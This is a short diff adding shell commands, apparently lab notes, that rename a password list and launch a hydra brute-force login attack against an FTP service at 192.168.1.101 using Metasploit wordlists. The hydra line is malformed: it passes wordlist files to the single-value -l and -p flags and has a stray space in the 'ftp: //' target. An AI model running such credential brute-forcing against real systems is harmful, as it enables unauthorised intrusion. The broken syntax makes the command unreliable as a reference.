@@ -1,0 +1,5 @@
+sudo mv password.lst passwords
+
+ls
+
+hydra -l /usr/share/wordlists/metasploit/user -p /usr/share/wordlists/metasploit/passwords ftp: //192.168.1.101 -V
